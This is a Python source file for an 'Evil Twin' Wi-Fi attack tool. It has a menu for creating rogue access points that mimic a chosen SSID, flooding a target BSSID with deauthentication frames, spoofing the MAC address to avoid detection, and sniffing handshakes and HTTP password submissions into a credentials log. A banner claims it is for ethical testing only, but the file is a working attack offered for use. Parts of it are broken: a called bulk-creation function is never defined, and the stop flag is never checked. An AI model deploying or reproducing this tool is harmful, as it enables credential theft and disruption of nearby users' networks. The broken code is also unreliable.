import os
import sys
import time
import random
import subprocess
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from colorama import Fore, init
import threading

init(autoreset=True)  # Colorama init

# Global variables
LOG_FILE = "creds.txt"
DEAUTH_THREAD = None
MONITOR_THREAD = None
STOP_FLAG = False

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""{Fore.RED}
   ▄████████ ███▄▄▄▄      ▄██████▄     ▄████████    ▄█   ▄█▄    ▄████████ 
  ███    ███ ███▀▀▀██▄   ███    ███   ███    ███   ███ ▄███▀   ███    ███ 
  ███    █▀  ███   ███   ███    ███   ███    █▀    ███▐██▀     ███    █▀  
  ███        ███   ███  ▄███▄▄▄▄██▀  ▄███▄▄▄       ▄█████▀     ▄███▄▄▄     
▀███████████ ███   ███ ▀▀███▀▀▀▀▀   ▀▀███▀▀▀      ▀▀█████▄    ▀▀███▀▀▀     
         ███ ███   ███ ▀███████████   ███    █▄     ███▐██▄     ███    █▄ 
   ▄█    ███ ███   ███   ███    ███   ███    ███   ███ ▀███▄   ███    ███ 
 ▄████████▀   ▀█   █▀    ███    ███   ██████████   ███   ▀█▀   ██████████ 
                          ███    ███                                      
    {Fore.RESET}{Fore.CYAN}[ Advanced Fake Wi-Fi Creator (Evil Twin) - Windows 11 ]{Fore.RESET}
    {Fore.YELLOW}⚠ WARNING: For Ethical Hacking & Penetration Testing Only! ⚠{Fore.RESET}
    """
    print(banner)

def log_credentials(ssid, password=None):
    """Log captured credentials to a file"""
    with open(LOG_FILE, "a") as f:
        if password:
            f.write(f"[+] SSID: {ssid} | Password: {password}\n")
        else:
            f.write(f"[+] SSID: {ssid} | Open Network\n")

def random_bssid():
    """Generate a random BSSID (MAC) for the fake AP"""
    return "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

def spoof_mac(interface="Wi-Fi"):
    """Spoof MAC address to avoid detection"""
    new_mac = random_bssid()
    try:
        subprocess.run(f'netsh interface set interface "{interface}" admin=disable', shell=True)
        subprocess.run(f'netsh interface set interface "{interface}" admin=enable', shell=True)
        subprocess.run(f'netsh interface set interface "{interface}" newmac={new_mac}', shell=True)
        print(f"{Fore.GREEN}[+] MAC address spoofed to: {new_mac}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[-] MAC spoofing failed: {e}{Fore.RESET}")

def enable_wifi_support():
    """Enable Wi-Fi hosted network support"""
    try:
        subprocess.run('netsh wlan set hostednetwork mode=allow', shell=True, check=True)
        print(f"{Fore.GREEN}[+] Hosted network support enabled.{Fore.RESET}")
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[-] Failed to enable hosted network support. Run as Admin!{Fore.RESET}")
        sys.exit(1)

def create_fake_wifi(ssid, password=None):
    """Create a fake Wi-Fi network with randomized BSSID"""
    bssid = random_bssid()
    try:
        if password:
            subprocess.run(f'netsh wlan set hostednetwork ssid="{ssid}" key="{password}" keyUsage=persistent', shell=True, check=True)
            print(f"{Fore.GREEN}[+] Fake Wi-Fi '{ssid}' (BSSID: {bssid}) created with password: {password}{Fore.RESET}")
        else:
            subprocess.run(f'netsh wlan set hostednetwork ssid="{ssid}" keyUsage=persistent', shell=True, check=True)
            print(f"{Fore.GREEN}[+] Fake Wi-Fi '{ssid}' (BSSID: {bssid}) created (Open Network){Fore.RESET}")
        
        subprocess.run('netsh wlan start hostednetwork', shell=True, check=True)
        print(f"{Fore.GREEN}[+] Fake Wi-Fi '{ssid}' is now active!{Fore.RESET}")
        log_credentials(ssid, password)
        return True
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[-] Failed to create fake Wi-Fi.{Fore.RESET}")
        return False

def deauth_attack(target_bssid, interface="Wi-Fi", count=3):
    """Send deauthentication packets to force reconnection"""
    print(f"{Fore.YELLOW}[*] Starting deauthentication attack on {target_bssid}...{Fore.RESET}")
    pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
    sendp(pkt, iface=interface, count=count, inter=0.1, verbose=False)

def start_deauth_thread(target_bssid):
    """Run deauth attack in a thread"""
    global DEAUTH_THREAD, STOP_FLAG
    STOP_FLAG = False
    DEAUTH_THREAD = threading.Thread(target=deauth_attack, args=(target_bssid,))
    DEAUTH_THREAD.daemon = True
    DEAUTH_THREAD.start()

def stop_deauth_thread():
    """Stop the deauth attack"""
    global STOP_FLAG
    STOP_FLAG = True
    if DEAUTH_THREAD:
        DEAUTH_THREAD.join()
    print(f"{Fore.RED}[!] Deauthentication attack stopped.{Fore.RESET}")

def packet_handler(pkt):
    """Capture Wi-Fi handshakes and log credentials"""
    if pkt.haslayer(EAPOL):
        ssid = pkt.info.decode() if pkt.info else "Unknown"
        print(f"{Fore.RED}[!] Possible password attempt detected on: {ssid}{Fore.RESET}")
        if pkt.haslayer(Raw):
            log_credentials(ssid, "Handshake captured")
    
    # Detect HTTP traffic (simulate captive portal)
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        if b"POST" in pkt[Raw].load or b"password" in pkt[Raw].load.lower():
            print(f"{Fore.RED}[!] Possible credential submission detected!{Fore.RESET}")
            log_credentials("Captive Portal", "Check HTTP traffic")

def start_monitor_mode():
    """Monitor mode to detect password attempts"""
    global MONITOR_THREAD
    print(f"{Fore.YELLOW}[*] Starting monitor mode (Ctrl+C to stop)...{Fore.RESET}")
    MONITOR_THREAD = threading.Thread(target=lambda: sniff(iface="Wi-Fi", prn=packet_handler, store=0))
    MONITOR_THREAD.daemon = True
    MONITOR_THREAD.start()

def stop_monitor_mode():
    """Stop monitor mode"""
    if MONITOR_THREAD:
        MONITOR_THREAD.join(0.1)
    print(f"{Fore.RED}[!] Monitor mode stopped.{Fore.RESET}")

def auto_stop_timer(minutes):
    """Auto-stop the fake AP after X minutes"""
    time.sleep(minutes * 60)
    subprocess.run('netsh wlan stop hostednetwork', shell=True)
    print(f"{Fore.RED}[!] Auto-stopped fake Wi-Fi after {minutes} minutes.{Fore.RESET}")
    sys.exit(0)

def main():
    clear_screen()
    print_banner()
    enable_wifi_support()

    print(f"{Fore.CYAN}\n[1] Create Single Fake Wi-Fi")
    print("[2] Bulk Create from .txt/.lst File")
    print("[3] Start Deauthentication Attack")
    print("[4] Start Password Monitor")
    print("[5] Spoof MAC Address")
    print("[6] Auto-Stop After X Minutes")
    print("[7] Exit\n")

    choice = input(f"{Fore.YELLOW}[?] Select an option (1-7): {Fore.RESET}")

    if choice == "1":
        ssid = input(f"{Fore.YELLOW}[?] Enter SSID to mimic: {Fore.RESET}")
        has_pass = input(f"{Fore.YELLOW}[?] Add password? (y/n): {Fore.RESET}").lower()
        if has_pass == "y":
            password = input(f"{Fore.YELLOW}[?] Enter fake password: {Fore.RESET}")
            create_fake_wifi(ssid, password)
        else:
            create_fake_wifi(ssid)
    
    elif choice == "2":
        file_path = input(f"{Fore.YELLOW}[?] Enter file path (.txt/.lst): {Fore.RESET}")
        has_pass = input(f"{Fore.YELLOW}[?] Use a default password for all? (y/n): {Fore.RESET}").lower()
        if has_pass == "y":
            password = input(f"{Fore.YELLOW}[?] Enter default password: {Fore.RESET}")
            bulk_create_from_file(file_path, True, password)
        else:
            bulk_create_from_file(file_path)
    
    elif choice == "3":
        target_bssid = input(f"{Fore.YELLOW}[?] Enter target BSSID (MAC): {Fore.RESET}")
        start_deauth_thread(target_bssid)
        input(f"{Fore.YELLOW}[?] Press Enter to stop deauth attack...{Fore.RESET}")
        stop_deauth_thread()
    
    elif choice == "4":
        start_monitor_mode()
        input(f"{Fore.YELLOW}[?] Press Enter to stop monitoring...{Fore.RESET}")
        stop_monitor_mode()
    
    elif choice == "5":
        spoof_mac()
    
    elif choice == "6":
        minutes = int(input(f"{Fore.YELLOW}[?] Auto-stop after how many minutes?: {Fore.RESET}"))
        threading.Thread(target=auto_stop_timer, args=(minutes,)).start()
        print(f"{Fore.GREEN}[+] Fake Wi-Fi will auto-stop in {minutes} minutes.{Fore.RESET}")
    
    elif choice == "7":
        print(f"{Fore.RED}[!] Exiting...{Fore.RESET}")
        sys.exit(0)
    
    else:
        print(f"{Fore.RED}[-] Invalid choice!{Fore.RESET}")

if __name__ == "__main__":
    main()
